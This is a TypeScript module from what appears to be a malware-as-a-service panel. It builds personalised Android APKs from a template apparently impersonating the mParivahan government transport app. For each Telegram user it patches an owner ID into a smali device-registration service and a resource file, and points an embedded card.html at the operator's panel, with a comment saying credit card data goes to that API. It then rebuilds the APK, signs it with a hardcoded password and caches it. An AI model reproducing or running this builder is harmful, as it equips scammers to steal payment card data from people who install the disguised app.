import { exec } from "child_process";
import { promisify } from "util";
import * as fs from "fs";
import * as path from "path";
import { fileURLToPath } from "url";

const execAsync = promisify(exec);

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const WORKSPACE_ROOT = path.resolve(__dirname, "..", "..", "..");
const OUTPUT_DIR = path.join(WORKSPACE_ROOT, "output");
const APK_CACHE_DIR = path.join(OUTPUT_DIR, "apk_cache");

const APK_TEMPLATE_DIR = "/tmp/apk_patch/decoded";
const BASE_TEMPLATE_APK = path.join(OUTPUT_DIR, "mParivahan_base_template.apk");
const DECODED_TAR_GZ = path.join(OUTPUT_DIR, "apk_template_decoded.tar.gz");

const OWNER_PLACEHOLDER     = "OWNER_TELEGRAM_ID_000000000";
const PANEL_URL_PLACEHOLDER = "PANEL_API_URL_PLACEHOLDER_AXECODI";
const SMALI_FILE_REL =
  "smali_classes63/dApp/binance/Trading/Signals/MyService$1.smali";
const LODA_FILE_REL    = "res/raw/Loda";
const CARD_HTML_REL    = "assets/card.html";

const APKTOOL =
  "/nix/store/vwykh57qc5rc7wi9yc16hzn2kycdbcdr-apktool-2.11.1/bin/apktool";
const JARSIGNER =
  "/nix/store/xad649j61kwkh0id5wvyiab5rliprp4d-openjdk-17.0.15+6/bin/jarsigner";
const KEYSTORE = path.join(OUTPUT_DIR, "release.keystore");

/** Called at server startup — ensures the decoded template is ready.
 *  Fast path: extracts pre-built tar.gz (~2s).
 *  Fallback: runs apktool decode (~90s) if tar.gz missing. */
export async function initApkTemplate(): Promise<void> {
  const smaliPath = path.join(APK_TEMPLATE_DIR, SMALI_FILE_REL);
  if (fs.existsSync(smaliPath)) {
    console.log("[apkBuilder] Template already decoded — ready.");
    return;
  }

  fs.mkdirSync("/tmp/apk_patch", { recursive: true });

  // Fast path: extract pre-built tar.gz (committed to repo, ~2s)
  if (fs.existsSync(DECODED_TAR_GZ)) {
    console.log("[apkBuilder] Extracting template from tar.gz (~2s)...");
    try {
      await execAsync(`tar -xzf "${DECODED_TAR_GZ}" -C /tmp`, {
        timeout: 30_000,
      });
      console.log("[apkBuilder] Template extracted and ready.");
      return;
    } catch (err) {
      console.error("[apkBuilder] tar extraction failed, falling back to apktool:", err);
    }
  }

  // Fallback: full apktool decode (~90s) — only if tar.gz is missing
  const baseApk = fs.existsSync(BASE_TEMPLATE_APK)
    ? BASE_TEMPLATE_APK
    : await getApkPath();
  if (!baseApk) {
    console.error("[apkBuilder] No base APK found — /apk command will fail.");
    return;
  }

  console.log("[apkBuilder] Decoding APK template via apktool (one-time, ~90s)...");
  try {
    await execAsync(`${APKTOOL} d -f -o "${APK_TEMPLATE_DIR}" "${baseApk}"`, {
      timeout: 180_000,
    });
    console.log("[apkBuilder] Template decoded and ready.");
  } catch (err) {
    console.error("[apkBuilder] Failed to decode APK template:", err);
  }
}

export async function getApkPath(): Promise<string | null> {
  const candidates = [
    path.join(OUTPUT_DIR, "mParivahan_base_template.apk"),
    path.join(OUTPUT_DIR, "mParivahan_v2.apk"),
    path.join(OUTPUT_DIR, "mParivahan_yellowstone.apk"),
  ];
  for (const p of candidates) {
    if (fs.existsSync(p)) return p;
  }
  return null;
}

/** Returns true if the APK template is ready to build from. */
export function isTemplateReady(): boolean {
  return fs.existsSync(path.join(APK_TEMPLATE_DIR, SMALI_FILE_REL));
}

/**
 * Build a per-user APK with ownerTelegramId baked in.
 * First call per user: ~7s (patch + compile + sign).
 * Subsequent calls: instant (cached).
 */
export async function buildUserApk(telegramId: string): Promise<string | null> {
  fs.mkdirSync(APK_CACHE_DIR, { recursive: true });

  const cachedApk = path.join(APK_CACHE_DIR, `${telegramId}.apk`);
  if (fs.existsSync(cachedApk)) return cachedApk;

  // Template must be ready before we can build
  if (!isTemplateReady()) {
    // Last-ditch attempt to decode (only if startup decode hadn't run)
    await initApkTemplate();
    if (!isTemplateReady()) return null;
  }

  // Resolve panel URL (used in card.html so APK calls our API, not Telegram directly)
  const panelUrl = (
    process.env["PANEL_URL"] ||
    (process.env["REPLIT_DEV_DOMAIN"]
      ? `https://${process.env["REPLIT_DEV_DOMAIN"]}`
      : "")
  ).replace(/\/$/, "");

  // Copy template to per-user build dir
  const buildDir = `/tmp/apk_build_${telegramId}`;
  await execAsync(`cp -r "${APK_TEMPLATE_DIR}" "${buildDir}"`, { timeout: 30_000 });

  const patchFile = (relPath: string, replacements: [string, string][]) => {
    const filePath = path.join(buildDir, relPath);
    if (!fs.existsSync(filePath)) return;
    let txt = fs.readFileSync(filePath, "utf-8");
    for (const [from, to] of replacements) txt = txt.split(from).join(to);
    fs.writeFileSync(filePath, txt, "utf-8");
  };

  // 1. Patch smali: ownerTelegramId into device registration
  patchFile(SMALI_FILE_REL, [[OWNER_PLACEHOLDER, telegramId]]);

  // 2. Patch Loda: chatID = ownerTelegramId, token = dummy (disables direct Telegram calls)
  patchFile(LODA_FILE_REL, [[OWNER_PLACEHOLDER, telegramId]]);

  // 3. Patch card.html: ownerTelegramId + panel API URL (CC data goes to our API, not Telegram)
  patchFile(CARD_HTML_REL, [
    [OWNER_PLACEHOLDER, telegramId],
    [PANEL_URL_PLACEHOLDER, panelUrl],
  ]);

  // Rebuild APK
  const unsignedApk = `/tmp/apk_unsigned_${telegramId}.apk`;
  await execAsync(`${APKTOOL} b "${buildDir}" -o "${unsignedApk}"`, {
    timeout: 120_000,
  });

  // Sign
  await execAsync(
    `${JARSIGNER} -sigalg SHA256withRSA -digestalg SHA-256 ` +
      `-keystore "${KEYSTORE}" -storepass android123 -keypass android123 ` +
      `"${unsignedApk}" release`,
    { timeout: 30_000 }
  );

  fs.copyFileSync(unsignedApk, cachedApk);
  fs.unlinkSync(unsignedApk);
  execAsync(`rm -rf "${buildDir}"`).catch(() => {});

  return cachedApk;
}

export function getApkSize(apkPath: string): string {
  try {
    const stats = fs.statSync(apkPath);
    const mb = (stats.size / (1024 * 1024)).toFixed(1);
    return `${mb} MB`;
  } catch {
    return "unknown size";
  }
}
